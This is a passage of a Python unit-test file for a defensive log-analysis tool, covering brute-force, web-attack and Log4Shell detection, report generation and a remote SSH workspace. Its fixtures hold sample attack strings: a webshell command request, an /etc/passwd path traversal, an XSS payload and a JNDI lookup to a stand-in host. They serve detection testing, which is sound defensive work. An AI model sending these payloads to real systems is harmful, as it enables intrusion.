            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        summary = run_detection(result.events)
        bf = [a for a in summary.alerts if a.rule_id == "BRUTE-001"]
        self.assertTrue(bf, "应当至少触发一个暴力破解告警")
        # n>=20 公网 IP 时 confidence=high；私网降级为 medium
        self.assertEqual(bf[0].confidence, "medium")
        self.assertTrue(any("内网" in e for e in bf[0].evidence))

    def test_private_ip_check_only_matches_rfc1918_ranges(self):
        """保留/文档网段不应当被当作内网地址降级。"""
        self.assertTrue(is_private_ip("10.1.2.3"))
        self.assertTrue(is_private_ip("172.16.0.1"))
        self.assertTrue(is_private_ip("172.31.255.255"))
        self.assertTrue(is_private_ip("192.168.1.1"))
        self.assertFalse(is_private_ip("172.32.0.1"))
        self.assertFalse(is_private_ip("203.0.113.50"))
        self.assertFalse(is_private_ip("198.51.100.70"))

    def test_event_id_generation_is_thread_safe(self):
        reset_counter()
        with ThreadPoolExecutor(max_workers=16) as pool:
            ids = list(pool.map(lambda _i: gen_id("thr"), range(1000)))
        self.assertEqual(len(ids), 1000)
        self.assertEqual(len(set(ids)), 1000)

    def test_cross_year_syslog_lines_advance_year_on_month_rollback(self):
        """12 月之后出现 1 月份事件，应自动 +1 年。"""
        content = (
            "Dec 31 23:59:59 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
            "Jan 01 00:00:01 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
        )
        # 显式指定 2024 起点，便于断言
        set_syslog_year(2024)
        try:
            result = parse_linux_auth(content, "auth.log")
        finally:
            set_syslog_year(None)
        timestamps = sorted(e.timestamp for e in result.events)
        self.assertTrue(timestamps[0].startswith("2024-12-31"))
        self.assertTrue(timestamps[-1].startswith("2025-01-01"))

    def test_ddos_uses_per_minute_window_not_total_count(self):
        """同样总量、不同时间分布：分散一天的访问不算 DDoS，集中一分钟才是。"""
        # 600 条请求分散在 600 分钟里 → 不应触发 DDoS（每分钟仅 1 次）
        spread = "".join(
            "1.1.1.1 - - [15/Mar/2024:%02d:%02d:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i // 60, i % 60)
            for i in range(600)
        )
        spread_result = parse_web_access(spread, "access.log")
        ddos_tags = [
            ev for ev in spread_result.events if "ddos" in ev.tags
        ]
        self.assertEqual(ddos_tags, [], "分散一天的访问不应当被识别为 DDoS")

    def test_html_report_attack_chain_has_no_trailing_arrow(self):
        """攻击链 HTML 末尾不能多出一个孤立箭头。"""
        # 用 webshell + 显式凭据生成多阶段攻击
        web_content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(web_content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")
        # chain-wrapper 内 9 个 phase 之间应该恰好 8 个箭头（不是 9 个）
        chain_section = html.split('class="chain-wrapper"', 1)[1].split("</div>", 50)[0:50]
        chain_block = "".join(chain_section)
        self.assertEqual(chain_block.count('class="chain-arrow"'), 8)

    def test_windows_eventid_4740_account_lockout_recognized(self):
        """4740 账户锁定应被识别为 HIGH 级账户管理事件。"""
        xml = (
            "<Event><System><EventID>4740</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"TargetDomainName\">CORP</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("account-lockout", event.tags)

    def test_windows_xml_parse_errors_are_counted_not_silenced(self):
        """损坏的 XML 块应进入 parse_errors 而不是被静默吞掉。"""
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        # 故意构造一个无法解析的 XML（属性引号未闭合）
        bad_xml = "<Event><System><EventID>4625</EventID><Bad attr=\"unclosed></System></Event>"
        result = parse_windows_xml(good_xml + "\n" + bad_xml, "Security.xml")
        self.assertEqual(len(result.events), 1)
        self.assertGreaterEqual(result.stats.parse_errors, 1)

    def test_generic_parser_warns_when_truncating(self):
        """通用解析器超过行数限制必须打印 warning，不能静默丢数据。"""
        big_content = "\n".join(f"line {i:04d}: hello world" for i in range(10_500))
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            _parse_generic(big_content, "huge.log")
            stderr = sys.stderr.getvalue()
        finally:
            sys.stderr = old_stderr
        self.assertIn("截断", stderr)
        self.assertIn("10500", stderr.replace(",", ""))

    # ---- 深度重构覆盖：解析层去聚合 / 阈值集中 / SARIF / IOC 收紧 ----

    def test_parser_no_longer_mutates_event_levels_for_aggregation(self):
        """解析层不再回写 brute-force 聚合级别——单条 SSH 失败应保持 MEDIUM。"""
        # 25 条来自同一公网 IP 的 SSH 失败：旧实现解析阶段就会升级到 CRITICAL，
        # 重构后单条事件保持解析期初始 level，告警在 detection 层产出。
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 9.9.9.9 port 22 ssh2"
            for i in range(25)
        ]
        result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
        # 不应该有一条事件被解析层标记为 CRITICAL
        self.assertEqual(
            sum(1 for e in result.events if e.level == ThreatLevel.CRITICAL), 0,
            "解析层不应该自己升级 CRITICAL，告警由 detection 层负责"
        )
        # detection 层仍要能产出告警
        summary = run_detection(result.events)
        self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))

    def test_thresholds_can_be_overridden_at_runtime(self):
        """通过 set_thresholds 临时降低阈值，让小样本也能触发暴力破解告警。"""
        original = THRESHOLDS
        try:
            set_thresholds(Thresholds(
                brute_force_min=2,
                brute_force_high=2,
                brute_force_critical=10,
            ))
            lines = [
                f"Mar 15 09:00:{i:02d} host sshd[1234]: "
                f"Failed password for bob from 9.9.9.9 port 22 ssh2"
                for i in range(3)
            ]
            result = parse_linux_auth("\n".join(lines) + "\n", "auth.log")
            summary = run_detection(result.events)
            self.assertTrue(any(a.rule_id == "BRUTE-001" for a in summary.alerts))
        finally:
            set_thresholds(original)

    def test_thresholds_load_from_json_file_with_partial_override(self):
        """阈值文件只覆盖指定字段，其余保留默认。"""
        with tempfile.TemporaryDirectory() as tmp:
            cfg_path = Path(tmp) / "th.json"
            cfg_path.write_text(_json.dumps({"brute_force_critical": 99}), encoding="utf-8")
            loaded = load_thresholds(str(cfg_path))
        self.assertEqual(loaded.brute_force_critical, 99)
        # 其它字段沿用默认
        self.assertEqual(loaded.spray_min_unique_users, THRESHOLDS.spray_min_unique_users)

    def test_sarif_report_is_valid_and_maps_levels(self):
        """SARIF 输出应当包含 runs/tool/rules/results，且严重告警 → "error"。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result], summary, str(sarif_path))
            data = _json.loads(sarif_path.read_text(encoding="utf-8"))

        self.assertEqual(data["version"], "2.1.0")
        self.assertGreaterEqual(len(data["runs"]), 1)
        run = data["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "BlueTeam Log Analyzer")
        self.assertGreaterEqual(len(run["results"]), 1)
        # 至少一个 result level 是 "error"（CRITICAL/HIGH 都映射到 error）
        self.assertTrue(any(r["level"] == "error" for r in run["results"]))

    def test_sarif_keeps_first_matching_source_file_for_cross_file_alert(self):
        event_a = LogEvent(
            id="e-a", timestamp="2024-03-15T10:00:00", level=ThreatLevel.HIGH,
            category="测试", source="fixture", source_file="first.log",
            message="first", raw_line="first",
        )
        event_b = LogEvent(
            id="e-b", timestamp="2024-03-15T10:01:00", level=ThreatLevel.HIGH,
            category="测试", source="fixture", source_file="second.log",
            message="second", raw_line="second",
        )
        alert = DetectionAlert(
            id="a-cross", rule_id="TEST-001", rule_name="跨文件告警",
            description="cross file", level=ThreatLevel.HIGH, category="测试",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e-a", "e-b"], evidence=[],
            recommendation="", timestamp="2024-03-15T10:01:00", confidence="high",
        )
        summary = AnalysisSummary(
            risk_score=0, risk_level=ThreatLevel.INFO, alerts=[alert],
            timeline=[], attack_chain=[], recommendations=[],
            total_events=2, files_analyzed=2,
        )
        result_a = ParseResult("first.log", "Fixture", [event_a], ParseStats(total=1))
        result_b = ParseResult("second.log", "Fixture", [event_b], ParseStats(total=1))

        with tempfile.TemporaryDirectory() as tmp:
            sarif_path = Path(tmp) / "report.sarif"
            generate_sarif_report([result_a, result_b], summary, str(sarif_path))
            data = _json.loads(sarif_path.read_text(encoding="utf-8"))

        uri = data["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
        self.assertEqual(uri, "first.log")

    def test_ioc_drops_boring_paths_but_keeps_attack_paths(self):
        """IOC 路径列表只保留有意义的路径，过滤 / 和 /index.html 这类噪音。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertTrue(any("etc/passwd" in p for p in iocs["file_paths"]),
                        "命中 LFI 的关键路径必须保留")
        self.assertNotIn("/", iocs["file_paths"], "根路径不应进 IOC")
        self.assertNotIn("/index", iocs["file_paths"])

    def test_ioc_filters_default_domain_blocklist(self):
        """example.com / localhost 不应进入 IOC 域名列表。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /shell.php?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://localhost/test\" \"curl http://example.com\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertNotIn("example.com", iocs["domains"])
        self.assertNotIn("localhost", iocs["domains"])

    def test_report_bundle_generates_standard_outputs(self):
        """--out 背后的 bundle 输出应生成完整交付目录。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "report"
            paths = generate_report_bundle([result], summary, str(out_dir))
            for key in ("html", "json", "csv", "ioc", "sarif"):
                self.assertTrue(Path(paths[key]).exists(), key)
            self.assertEqual(Path(paths["html"]).name, "index.html")

    def test_builtin_yaml_web_rule_detects_log4shell(self):
        """内置 YAML 规则应参与 Web 检测。"""
        content = (
            "8.8.8.8 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8\"\n"
        )
        result = parse_web_access(content, "access.log")
        self.assertEqual(result.events[0].rule_name, "Log4Shell/JNDI 探测")
        self.assertIn("log4shell", result.events[0].tags)

    def test_custom_yaml_rules_can_extend_web_detection(self):
        """用户自定义 YAML 规则目录可扩展 Web 检测，无需改 Python 源码。"""
        with tempfile.TemporaryDirectory() as tmp:
            rules_dir = Path(tmp) / "rules"
            rules_dir.mkdir()
            (rules_dir / "web_custom.yaml").write_text(
                """
web_attacks:
  - id: WEB-CUSTOM-UNIT
    name: 单元测试自定义规则
    level: high
    category: Web攻击
    mitre: T1190
    tags: [custom-test, web-attack]
    patterns:
      - 'unit-test-probe'
""",
                encoding="utf-8",
            )
            set_rule_dirs([str(rules_dir)])
            try:
                content = (
                    "7.7.7.7 - - [15/Mar/2024:10:00:00 +0800] "
                    "\"GET /unit-test-probe HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
                )
                result = parse_web_access(content, "access.log")
            finally:
                set_rule_dirs([])
                reset_rule_cache()

        self.assertEqual(result.events[0].rule_name, "单元测试自定义规则")
        self.assertIn("custom-test", result.events[0].tags)
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: 单元测试自定义规则")
        self.assertEqual(alert.rule_id, "WEB-CUSTOM-UNIT")

    def test_invalid_custom_yaml_rule_fails_fast(self):
        with tempfile.TemporaryDirectory() as tmp:
            rules_dir = Path(tmp) / "rules"
            rules_dir.mkdir()
            (rules_dir / "bad.yaml").write_text(
                """
web_attacks:
  - id: WEB-BAD
    name: Bad regex
    severity: high
    mitre: T1190
    tags: [bad]
    patterns:
      - '['
""",
                encoding="utf-8",
            )
            try:
                with self.assertRaises(ValueError):
                    set_rule_dirs([str(rules_dir)])
            finally:
                set_rule_dirs([])
                reset_rule_cache()

    def test_web_alert_preserves_highest_event_level(self):
        """Web 聚合告警不应把单条 HIGH 事件降成 MEDIUM。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: XSS攻击")
        self.assertEqual(alert.level, ThreatLevel.HIGH)

    def test_auto_parse_streams_web_logs_from_file(self):
        """自动识别 Web 日志时应能直接从文件路径解析，并保留文件大小。"""
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
        self.assertGreater(result.file_size_bytes, 0)
        self.assertEqual(result.events[0].rule_name, "路径遍历")

    def test_parser_registry_supports_explicit_type_and_content_input(self):
        """解析层应支持强制类型和内存内容，方便 Remote Collector 复用。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        self.assertIn("web-access", list_parser_names())

        parsed = parse_content(content, "remote-host:/var/log/nginx/access.log")
        self.assertEqual(parsed.log_type, "Web Access Log (Apache/Nginx)")
        self.assertEqual(parsed.events[0].source_file, "remote-host:/var/log/nginx/access.log")

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(content, encoding="utf-8")
            forced = auto_parse(str(path), parser_name="generic")
        self.assertEqual(forced.log_type, "通用日志")

    def test_detector_registry_can_run_custom_detector_set(self):
        """检测层应允许替换/扩展 detector 列表，而不是只能改 engine.py。"""
        event = LogEvent(
            id="e-reg",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="danger",
            raw_line="danger",
        )

        def _fixture_detector(events):
            return [DetectionAlert(
                id="a-reg",
                rule_id="REG-001",
                rule_name="Registry detector",
                description=f"custom detector saw {len(events)} event(s)",
                level=ThreatLevel.HIGH,
                category="测试",
                mitre_attack="T1190",
                mitre_phase="初始访问",
                affected_events=[events[0].id],
                evidence=["custom evidence"],
                recommendation="custom recommendation",
                timestamp=events[0].timestamp,
                confidence="high",
            )]

        registry = DetectorRegistry()
        registry.register(DetectorSpec("fixture", _fixture_detector))

        self.assertIn("web-attacks", list_detector_names())
        summary = run_detection([event], pre_enriched=True, detector_registry=registry)
        self.assertEqual([alert.rule_id for alert in summary.alerts], ["REG-001"])

    # ---- 实战检测工具化：P0 归一化 / enrich / correlation / golden ----

    def test_builtin_rule_metadata_validates_cleanly(self):
        """内置 YAML 规则必须具备可维护的元数据标准。"""
        result = validate_web_attack_rules([])

        self.assertGreaterEqual(result["raw_rules"], 3)
        self.assertEqual(result["errors"], 0)
        self.assertEqual(result["warnings"], 0)

    def test_p0_events_expose_stable_normalized_fields(self):
        """P0 解析结果必须暴露统一字段，方便后续 enrich/correlation/report 使用。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "hvv_chain.jsonl"
        result = parse_p0_security_lines(path.read_text(encoding="utf-8").splitlines(), path.name)
        fields = (
            "source_type", "src_ip", "dst_ip", "asset", "account", "action",
            "status", "url", "command", "process", "bytes_out", "session_id", "trace_id",
        )

        self.assertEqual(len(result.events), 6)
        for event in result.events:
            for field in fields:
                self.assertIn(field, event.details)

        summary = run_detection(result.events, profile="cn-hvv")
        enriched = summary.timeline[0]
        self.assertIsNotNone(enriched)
        self.assertTrue(all("event_family" in event.details for event in result.events))
        self.assertTrue(all("asset_role" in event.details for event in result.events))

    def test_p0_hvv_chain_matches_golden_incident(self):
        """同一批 P0 样本的告警与 incident 结果必须稳定。"""
        reset_counter()
        base = Path(__file__).parent / "fixtures" / "p0"
        golden = _json.loads((base / "golden_hvv_chain.json").read_text(encoding="utf-8"))
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile=golden["profile"])

        self.assertEqual(summary.total_events, golden["total_events"])
        self.assertEqual(sorted({alert.rule_id for alert in summary.alerts}), golden["alert_rule_ids"])
        self.assertEqual(len(summary.incidents), golden["incident_count"])
        top = summary.incidents[0]
        self.assertEqual(top.level.value, golden["top_incident"]["level"])
        self.assertEqual(top.confidence, golden["top_incident"]["confidence"])
        self.assertEqual(top.source_types, golden["top_incident"]["source_types"])
        self.assertEqual(top.attack_phases, golden["top_incident"]["attack_phases"])
        self.assertGreaterEqual(len(top.timeline), 4)
        self.assertTrue(top.next_logs)

    def test_p0_benign_noise_does_not_create_high_risk_incident(self):
        """健康检查、正常堡垒机命令、少量 VPN 输错密码不应升级为案件。"""
        path = Path(__file__).parent / "fixtures" / "p0" / "benign_noise.jsonl"
        result = auto_parse(str(path))
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertEqual(len(summary.alerts), 0)
        self.assertEqual(len(summary.incidents), 0)

    def test_sample_access_log_does_not_create_near_duplicate_incidents(self):
        path = Path(__file__).parents[1] / "sample_logs" / "access.log"
        result = auto_parse(str(path))
        summary = run_detection(result.events)

        for idx, left in enumerate(summary.incidents):
            left_events = set(left.affected_events)
            for right in summary.incidents[idx + 1:]:
                right_events = set(right.affected_events)
                smaller = min(len(left_events), len(right_events))
                overlap = len(left_events & right_events)
                self.assertLess(overlap / smaller if smaller else 0, 0.8)

    def test_json_report_contains_incident_case_view(self):
        """JSON 报告必须包含 incident，便于 explain/API/二次处理。"""
        base = Path(__file__).parent / "fixtures" / "p0"
        result = auto_parse(str(base / "hvv_chain.jsonl"))
        summary = run_detection(result.events, profile="cn-hvv")

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.json"
            generate_json_report([result], summary, str(report_path))
            data = _json.loads(report_path.read_text(encoding="utf-8"))

        self.assertIn("incidents", data)
        self.assertEqual(len(data["incidents"]), len(summary.incidents))
        self.assertIn("next_logs", data["incidents"][0])

    # ---- 小套餐：incident kill chain 排序 + explain markdown ----------------

    def test_incident_attack_phases_follow_kill_chain_order(self):
        """incident.attack_phases 必须按 ATT&CK kill chain 顺序，不是字母序。"""
        from bla.detection.correlation import KILL_CHAIN_ORDER, correlate_incidents
        from bla.models import LogEvent as _LE

        def _ev(ev_id: str, family: str, level: ThreatLevel) -> _LE:
            return _LE(
                id=ev_id, timestamp="2026-05-08T10:00:00", level=level,
                category="测试", source="t", source_file="t.log",
                message=f"{family} 事件", raw_line="",
                ip="9.9.9.9", user="alice", host="host1",
                details={
                    "src_ip": "9.9.9.9", "account": "alice", "asset": "host1",
                    "event_family": family, "source_type": "waf",
                },
            )

        # 故意制造命令控制 / 初始访问 / 主机失陷 三个阶段，按字母 / 拼音
        # 它们的顺序绝对不会等于 ATT&CK kill chain 顺序，便于反向证明。
        events = [
            _ev("e1", "command-control", ThreatLevel.CRITICAL),
            _ev("e2", "initial-access", ThreatLevel.HIGH),
            _ev("e3", "compromise", ThreatLevel.CRITICAL),
        ]
        incidents = correlate_incidents(events, [])
        self.assertTrue(incidents, "应至少产出一个 incident")
        phases = incidents[0].attack_phases
        self.assertEqual(phases, ["初始访问", "主机失陷", "命令控制"])
        self.assertEqual(len(phases), len(set(phases)),
                         "incident 阶段不应有重复")
        # KILL_CHAIN_ORDER 顺序约束（防止后续误改）
        self.assertLess(KILL_CHAIN_ORDER.index("初始访问"),
                        KILL_CHAIN_ORDER.index("主机失陷"))
        self.assertLess(KILL_CHAIN_ORDER.index("主机失陷"),
                        KILL_CHAIN_ORDER.index("命令控制"))

    def test_html_report_renders_incident_killchain_chips(self):
        """HTML 报告 incident 卡片必须画出 mini kill chain，命中阶段 chip 高亮。"""
        from bla.detection.correlation import correlate_incidents
        from bla.models import LogEvent as _LE
        from bla.models import ParseResult, ParseStats

        events = [
            _LE(
                id="e1", timestamp="2026-05-08T10:00:00",
                level=ThreatLevel.CRITICAL, category="测试", source="t",
                source_file="t.log", message="m", raw_line="",
                ip="9.9.9.9", user="alice", host="h1",
                details={
                    "src_ip": "9.9.9.9", "account": "alice", "asset": "h1",
                    "event_family": "initial-access", "source_type": "waf",
                },
            )
        ]
        incidents = correlate_incidents(events, [])
        summary = AnalysisSummary(
            risk_score=80, risk_level=ThreatLevel.HIGH, alerts=[],
            timeline=[], attack_chain=[], recommendations=[],
            total_events=1, files_analyzed=1, incidents=incidents,
        )
        result = ParseResult(file_name="t.log", log_type="test",
                             events=events, stats=ParseStats(total=1))

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(path))
            html = path.read_text(encoding="utf-8")
        self.assertIn("incident-killchain", html)
        self.assertIn("kc-chip", html)
        self.assertIn("kc-hit", html, "命中阶段必须以高亮 chip 渲染")
        self.assertIn("kc-miss", html, "未命中阶段也要渲染（灰色）")

    def test_explain_markdown_format_renders_ticket_ready_doc(self):
        """explain --format markdown 应当产出可直接粘贴进工单的 Markdown。"""
        from bla_cli import _render_alert_markdown, _render_incident_markdown

        incident = {
            "id": "inc-001",
            "title": "测试案件",
            "level": "critical",
            "confidence": "high",
            "description": "9.9.9.9 攻击 web1",
            "affected_event_count": 5,
            "affected_alerts": ["a1", "a2"],
            "source_types": ["waf", "edr"],
            "attack_phases": ["初始访问", "主机失陷"],
            "source_ips": ["9.9.9.9"],
            "accounts": ["alice"],
            "assets": ["web1"],
            "evidence": ["日志源: waf, edr", "命中规则: WEB-SQLI"],
            "recommended_actions": ["隔离主机", "重置密码"],
            "next_logs": ["EDR 进程树"],
            "timeline": [
                {"timestamp": "2026-05-08T10:00:00", "level": "critical",
                 "source_file": "waf.log", "message": "SQL 注入命中"},
            ],
        }
        md = _render_incident_markdown(incident)
        self.assertIn("## 案件 inc-001：测试案件", md)
        self.assertIn("**级别**：critical", md)
        self.assertIn("**攻击阶段**：初始访问 → 主机失陷", md)
        self.assertIn("- [ ] 隔离主机", md)
        self.assertIn("| 时间 | 级别 | 来源 | 描述 |", md)
        self.assertIn("SQL 注入命中", md)

        alert_md = _render_alert_markdown({
            "id": "a1", "rule_id": "WEB-SQLI", "rule_name": "SQL注入",
            "level": "critical", "confidence": "high",
            "mitre_attack": "T1190", "mitre_phase": "初始访问",
            "affected_event_count": 1, "timestamp": "2026-05-08T10:00:00",
            "description": "...", "evidence": ["payload=union select"],
            "recommendation": "部署 WAF",
        })
        self.assertIn("## 告警 a1：SQL注入", alert_md)
        self.assertIn("**MITRE**：T1190 / 初始访问", alert_md)
        self.assertIn("- payload=union select", alert_md)
        self.assertIn("部署 WAF", alert_md)

    def test_analysis_pipeline_can_be_called_directly(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = run_analysis(AnalysisOptions(paths=[str(path)]))

        self.assertEqual(len(result.parse_results), 1)
        self.assertGreaterEqual(len(result.summary.alerts), 1)
        self.assertEqual(result.summary.files_analyzed, 1)

    def test_remote_workspace_bla_fetches_file_and_analyzes_locally(self):
        class FakeSSH:
            target = "web01"

            def __init__(self):
                self.fetches = []
                self.commands = []

            def run(self, command, timeout=60):
                self.commands.append(command)
                return type("Result", (), {
                    "returncode": 0,
                    "stdout": b"/var/log/nginx\n",
                    "stderr": b"",
                    "text": "/var/log/nginx\n",
                    "error_text": "",
                })()

            def fetch_file(self, remote_path, local_path, cwd):
                self.fetches.append((remote_path, cwd))
                Path(local_path).write_text(
                    "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                    "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                    encoding="utf-8",
                )

        fake = FakeSSH()
        output = io.StringIO()
        with tempfile.TemporaryDirectory() as tmp, mock.patch("sys.stdout", output):
            workspace = RemoteWorkspace(fake, initial_cwd="/var/log/nginx", print_fn=lambda *a, **k: print(*a, **k))
            code = workspace.execute_line(f"bla access.log --out {tmp}/case --exit-on none --no-color")
            report = Path(tmp) / "case" / "report.json"

            self.assertEqual(code, 0)
            self.assertTrue(report.exists())
            data = _json.loads(report.read_text(encoding="utf-8"))

        self.assertEqual(fake.fetches, [("access.log", "/var/log/nginx")])
        self.assertGreaterEqual(len(data["alerts"]), 1)
        self.assertEqual(data["files"][0]["name"], "web01:/var/log/nginx/access.log")
        self.assertEqual(data["events"][0]["source_file"], "web01:/var/log/nginx/access.log")
        self.assertNotIn("python", " ".join(fake.commands).lower())
        self.assertIn("开始本地分析", output.getvalue())

    def test_remote_workspace_cd_and_ls_use_whitelisted_remote_commands(self):
        class FakeSSH:
            target = "web01"

            def __init__(self):
                self.commands = []

            def run(self, command, timeout=60):
                self.commands.append(command)
                if "pwd -P" in command:
                    stdout = b"/var/log\n"
                else:
                    stdout = b"auth.log\nsecure\n"
                return type("Result", (), {
                    "returncode": 0,
                    "stdout": stdout,
                    "stderr": b"",
                    "text": stdout.decode(),
                    "error_text": "",
                })()

        fake = FakeSSH()
        workspace = RemoteWorkspace(fake, initial_cwd="/", print_fn=lambda *a, **k: None)

        self.assertEqual(workspace.execute_line("cd /var/log"), 0)
        self.assertEqual(workspace.cwd, "/var/log")
        self.assertEqual(workspace.execute_line("ls"), 0)
        self.assertEqual(workspace.execute_line("cd ~"), 0)
        self.assertEqual(workspace.execute_line("uname -a"), 2)
        self.assertTrue(any("cd / && cd /var/log && pwd -P" in command for command in fake.commands))
        self.assertTrue(any("ls -lah -- ." in command for command in fake.commands))
        self.assertTrue(any("cd /var/log && cd ~ && pwd -P" in command for command in fake.commands))

    def test_remote_workspace_command_split_keeps_windows_paths(self):
        parts = _split_workspace_line(r"bla access.log --out C:\Users\runner\AppData\Local\Temp\case")

        self.assertEqual(parts, [
            "bla",
            "access.log",
            "--out",
            r"C:\Users\runner\AppData\Local\Temp\case",
        ])

    def test_remote_workspace_can_analyze_journalctl_unit_output(self):
        class FakeSSH:
            target = "web01"

            def __init__(self):
                self.captures = []

            def run(self, command, timeout=60):
                return type("Result", (), {
                    "returncode": 0,
                    "stdout": b"/var/log\n",
                    "stderr": b"",
                    "text": "/var/log\n",
                    "error_text": "",
                })()

            def capture_command(self, command, local_path, cwd, timeout=None):
                self.captures.append((command, cwd))
                Path(local_path).write_text(
                    "Mar 15 10:01:00 web01 sshd[123]: "
                    "Failed password for root from 9.9.9.9 port 22 ssh2\n",
                    encoding="utf-8",
                )

        fake = FakeSSH()
        with tempfile.TemporaryDirectory() as tmp, mock.patch("sys.stdout", io.StringIO()):
            workspace = RemoteWorkspace(fake, initial_cwd="/var/log", print_fn=lambda *a, **k: print(*a, **k))
            code = workspace.execute_line(f"bla journalctl:ssh --out {tmp}/case --exit-on none --no-color")
            data = _json.loads((Path(tmp) / "case" / "report.json").read_text(encoding="utf-8"))

        self.assertEqual(code, 0)
        self.assertEqual(fake.captures, [("journalctl -u ssh --no-pager -o short", "/var/log")])
        self.assertEqual(data["files"][0]["name"], "web01:journalctl:ssh")
        self.assertEqual(data["events"][0]["source_file"], "web01:journalctl:ssh")
        self.assertEqual(data["events"][0]["category"], "SSH")

    def test_version_surfaces_are_consistent(self):
        repo = Path(__file__).parents[1]
        completed = subprocess.run(
            [sys.executable, "bla_cli.py", "--version"],
            cwd=repo,
            text=True,
            capture_output=True,
            check=True,
        )
        self.assertIn(__version__, completed.stdout)

        summary = AnalysisSummary(
            risk_score=0, risk_level=ThreatLevel.INFO, alerts=[],
            timeline=[], attack_chain=[], recommendations=[],
            total_events=0, files_analyzed=0,
        )
        with tempfile.TemporaryDirectory() as tmp:
            json_path = Path(tmp) / "report.json"
            sarif_path = Path(tmp) / "report.sarif"
            generate_json_report([], summary, str(json_path))
            generate_sarif_report([], summary, str(sarif_path))
